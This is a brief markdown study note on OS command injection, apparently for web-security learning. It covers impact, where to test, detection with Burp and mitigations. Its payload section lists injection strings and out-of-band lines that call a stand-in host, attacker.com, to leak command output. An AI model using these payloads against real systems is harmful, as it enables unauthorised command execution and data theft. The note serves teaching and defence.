# Command Injection

---

## Metadata
- **OWASP Category (2021):** A03 Injection  
- **PortSwigger Link:** [What is OS command injection, and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/os-command-injection)

---

## 💡 Concept
- **What is it?**  
> - Also known as shell injection  
> - Allows an attacker to execute arbitrary system (OS) commands on the hosting server  

- **Impact:**  
> - **Confidentiality:** Exfiltrate/expose server files and system secrets.  
> - **Integrity:** Execute arbitrary commands to alter/destroy system data.  
> - **Availability:** Crash servers or consume resources via malicious commands.  

---

## 🛠 Exploitation Notes
- **Where to test:**  
> - Form fields (search boxes, feedback forms, file upload fields)  
> - URL parameters and query strings  
> - Headers (User-Agent, Referer, etc.)  
> - POST body parameters (JSON, XML)  

- **Payloads**  
> - **Injecting commands with separators:**  
>   ```
>   ; ls
>   && whoami
>   | id
>   ```  
>
> - **Redirecting output:**  
>   ```
>   whoami > /var/www/html/whoami.txt
>   ```  
>
> - **Out-of-band (blind):**  
>   ```
>   nslookup attacker.com
>   curl http://attacker.com/$(whoami)
>   ```  

---

## 🔍 Detection
- **How to identify in apps:**  
> - Unusual error messages or response delays  
> - With Burp, this can be seen in Repeater when injecting OS commands, time-delay commands (e.g., `ping -c 10 127.0.0.1`), or blind injection detection  
> - Burp Scanner  

---

## 🛡 Mitigation
> - Avoid direct OS command execution with user input.  
> - Use safe APIs (language libraries instead of `system()` calls)  
> - Input validation and an allowlist  
> - WAF rules to detect common injection patterns  
> - Logging/monitoring unusual system calls  
> - Anomaly detection  

